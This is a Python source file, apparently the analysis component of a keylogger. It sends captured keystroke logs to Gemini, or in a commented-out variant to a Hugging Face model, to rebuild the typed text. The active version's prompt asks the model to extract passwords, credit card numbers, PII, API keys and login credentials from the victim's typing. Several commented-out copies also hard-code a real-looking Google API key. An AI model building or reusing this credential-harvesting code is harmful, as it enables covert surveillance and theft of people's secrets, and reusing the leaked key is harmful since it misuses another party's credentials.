# # # ai_analysis.py

# # import google.generativeai as genai

# # # Replace 'your-google-api-key' with your actual Google Gemini API key
# # GOOGLE_API_KEY = 'AIzaSyB76J0xs2XICAONAzbIGhEi8ZnO73uQ95Y'
# # genai.configure(api_key=GOOGLE_API_KEY)

# # def analyze_keystrokes(keystrokes):
# #     try:
# #         model = genai.GenerativeModel('gemini-1.5-flash')
# #         response = model.generate_content(f"Simulate the typing process from the provided keystroke log and output ONLY the final, intended text. Disregard all non-printing keystrokes, including but not limited to backspace, arrow keys, modifier keys, and function keys. The output should represent exactly what would be displayed on the screen after the entire sequence of keystrokes is processed:\n\n{keystrokes}")
# #         crucial_info = response.text.strip()
# #         return crucial_info
# #     except Exception as e:
# #         error_message = f"Error during AI analysis: {e}"
# #         print(error_message)
# #         return error_message  # Return the detailed error message for debugging

# # # Example usage
# # if __name__ == "__main__":
# #     sample_keystrokes = "Hello world! This is a test of the AI analysis."
# #     print(analyze_keystrokes(sample_keystrokes))


# #Simulate the typing process from the provided keystroke log and output ONLY the final, intended text. Ensure correct handling of capitalization: recognize when caps lock is toggled on/off and when shift is held down to capitalize letters. Disregard all non-printing keystrokes, including backspace, arrow keys, modifier keys, and function keys



# # ai_analysis.py

# import google.generativeai as genai

# # Replace 'your-google-api-key' with your actual Google Gemini API key
# GOOGLE_API_KEY = 'AIzaSyB76J0xs2XICAONAzbIGhEi8ZnO73uQ95Y'
# genai.configure(api_key=GOOGLE_API_KEY)

# def analyze_keystrokes(keystrokes):
#     try:
#         model = genai.GenerativeModel('gemini-1.5-flash')
#         response = model.generate_content(f"""Simulate the typing process from the provided keystroke log and output ONLY the final, intended text. Ensure correct handling of capitalization: recognize when caps lock is toggled on/off and when shift is held down to capitalize letters. Disregard all non-printing keystrokes, including backspace, arrow keys, modifier keys, and function keys:\n\n{keystrokes}""")
#         crucial_info = response.text.strip()
#         return crucial_info
#     except Exception as e:
#         error_message = f"Error during AI analysis: {e}"
#         print(error_message)
#         return error_message  # Return the detailed error message for debugging

# # Example usage
# if __name__ == "__main__":
#     sample_keystrokes = "Hello world! This is a test of the AI analysis."
#     print(analyze_keystrokes(sample_keystrokes))



# # # ai_analysis.py

# # import google.generativeai as genai

# # # Replace 'your-google-api-key' with your actual Google Gemini API key
# # GOOGLE_API_KEY = 'AIzaSyB76J0xs2XICAONAzbIGhEi8ZnO73uQ95Y'
# # genai.configure(api_key=GOOGLE_API_KEY)

# # def analyze_keystrokes(keystrokes):
# #     try:
# #         model = genai.GenerativeModel('gemini-1.5-flash')
# #         response = model.generate_content(f"Simulate the typing process from the provided keystroke log and output ONLY the final, intended text. Disregard all non-printing keystrokes, including but not limited to backspace, arrow keys, modifier keys, and function keys. The output should represent exactly what would be displayed on the screen after the entire sequence of keystrokes is processed:\n\n{keystrokes}")
# #         crucial_info = response.text.strip()
# #         return crucial_info
# #     except Exception as e:
# #         error_message = f"Error during AI analysis: {e}"
# #         print(error_message)
# #         return error_message  # Return the detailed error message for debugging

# # # Example usage
# # if __name__ == "__main__":
# #     sample_keystrokes = "Hello world! This is a test of the AI analysis."
# #     print(analyze_keystrokes(sample_keystrokes))


# #Simulate the typing process from the provided keystroke log and output ONLY the final, intended text. Ensure correct handling of capitalization: recognize when caps lock is toggled on/off and when shift is held down to capitalize letters. Disregard all non-printing keystrokes, including backspace, arrow keys, modifier keys, and function keys



# THIS IS USING GOOGLE
# ai_analysis.py

import google.generativeai as genai

# Replace 'your-google-api-key' with your actual Google Gemini API key
GOOGLE_API_KEY = 'your-google-api-key'
genai.configure(api_key=GOOGLE_API_KEY)

def analyze_keystrokes(keystrokes):
    try:
        model = genai.GenerativeModel('gemini-1.5-flash')
        response = model.generate_content(f"""
    Analyze the following keystroke log for sensitive information and interpret the typing process to simulate the final intended text. Ensure correct handling of capitalization: recognize when caps lock is toggled on/off and when shift is held down to capitalize letters. Disregard all non-printing keystrokes, including backspace, arrow keys, modifier keys, and function keys.

    In addition, highlight and extract sensitive information, including but not limited to:
    - Passwords
    - Personal Identification Information (PII) such as names, addresses, phone numbers, social security numbers, etc.
    - Credit card numbers
    - Confidential notes and messages
    - Code snippets that might contain API keys or secrets
    - Website links
    - Any form of login credentials or security phrases

    Display code or software-related patterns distinctly for clarity.

    This prompt instructs the AI to:
    1. Interpret the keystroke log to simulate typing.
    2. Handle caps lock and shift key states to manage capitalization.
    3. Filter out non-printing keystrokes.
    4. Highlight and extract sensitive information accurately, minimizing false positives.
    5. Display code or software-related patterns separately for clarity.

    Keystroke Log:
    {keystrokes}
    """)
        crucial_info = response.text.strip()
        return crucial_info
    except Exception as e:
        error_message = f"Error during AI analysis: {e}"
        print(error_message)
        return error_message  # Return the detailed error message for debugging

# Example usage
if __name__ == "__main__":
    sample_keystrokes = "Hello world! This is a test of the AI analysis."
    print(analyze_keystrokes(sample_keystrokes))










#     # ai_analysis.py

# import requests

# # Replace 'your-huggingface-api-token' with your actual Hugging Face API token
# HUGGINGFACE_API_TOKEN = ''
# MODEL_NAME = 'Qwen/Qwen2.5-Coder-32B-Instruct'
# API_URL = f'https://api-inference.huggingface.co/models/{MODEL_NAME}'

# headers = {
#     "Authorization": f"Bearer {HUGGINGFACE_API_TOKEN}"
# }

# def analyze_keystrokes(keystrokes):
#     try:
#         prompt = f"""
# Analyze the following keystroke log for sensitive information and interpret the typing process to simulate the final intended text. Ensure correct handling of capitalization: recognize when caps lock is toggled on/off and when shift is held down to capitalize letters. Disregard all non-printing keystrokes, including backspace, arrow keys, modifier keys, and function keys.

# In addition, highlight and extract sensitive information, including but not limited to:
# - Passwords
# - Personal Identification Information (PII) such as names, addresses, phone numbers, social security numbers, etc.
# - Credit card numbers
# - Confidential notes and messages
# - Code snippets that might contain API keys or secrets
# - Any form of login credentials or security phrases

# Display code or software-related patterns distinctly for clarity.

# This prompt instructs the AI to:
# 1. Interpret the keystroke log to simulate typing.
# 2. Handle caps lock and shift key states to manage capitalization.
# 3. Filter out non-printing keystrokes.
# 4. Highlight and extract sensitive information accurately, minimizing false positives.
# 5. Display code or software-related patterns separately for clarity.

# Keystroke Log:
# {keystrokes}
# """

#         payload = {
#             "inputs": prompt,
#             "options": {
#                 "use_cache": False
#             }
#         }

#         response = requests.post(API_URL, headers=headers, json=payload)

#         if response.status_code == 200:
#             result = response.json()
#             # Depending on the model and API, the response structure might vary
#             # Typically, Hugging Face returns a list of generated texts
#             if isinstance(result, list) and 'generated_text' in result[0]:
#                 crucial_info = result[0]['generated_text'].strip()
#                 return crucial_info
#             elif isinstance(result, dict) and 'error' in result:
#                 return f"Error from model: {result['error']}"
#             else:
#                 # Fallback if the response structure is different
#                 return str(result).strip()
#         else:
#             return f"Request failed with status code {response.status_code}: {response.text}"

#     except Exception as e:
#         error_message = f"Error during AI analysis: {e}"
#         print(error_message)
#         return error_message  # Return the detailed error message for debugging

# # Example usage
# if __name__ == "__main__":
#     sample_keystrokes = "Hello world! This is a test of the AI analysis."
#     print(analyze_keystrokes(sample_keystrokes))
